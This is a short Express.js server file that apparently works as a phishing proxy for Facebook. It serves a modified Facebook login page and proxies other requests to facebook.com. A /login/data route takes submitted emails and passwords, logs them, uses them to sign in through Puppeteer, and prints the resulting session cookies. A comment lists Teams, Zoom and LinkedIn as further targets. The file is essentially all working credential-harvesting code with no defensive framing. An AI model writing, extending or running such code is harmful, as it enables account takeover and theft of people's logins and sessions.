import express from 'express';
import { getModifiedFacebookLoginPage, loginToFacebook } from './puppeteerClient.js';
import bodyParser from 'body-parser';
import axios from 'axios'; // Import axios for making HTTP requests


//teams, zoom, linkedin
const app = express();
const port = 8080;
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Route to fetch and return the modified Facebook login page
app.get('/login', async (req, res) => {
    try {
        const html = await getModifiedFacebookLoginPage();
        res.send(html);
    } catch (error) {
        console.error('Error fetching login page:', error);
        res.status(500).send('An error occurred');
    }
});

app.get('/login/data', async (req, res) => {
    const { email, password } = req.query;
    console.log(req.query);
    try {
        const { pageContent, cookies } = await loginToFacebook(email, password);
        console.log(cookies);
        res.send(pageContent);
    } catch (error) {
        console.error('Error logging in to Facebook:', error);
        res.status(500).send('An error occurred during login');
    }
});


app.all('*', async (req, res) => {
    const url = `https://www.facebook.com${req.url}`;
    try {
        const response = await axios.get(url, {
            headers: {
                // Add any necessary headers here if required
            }
        });
        res.send(response.data);
    } catch (error) {
        res.status(500).send('An error occurred while proxying the request');
    }
});


app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
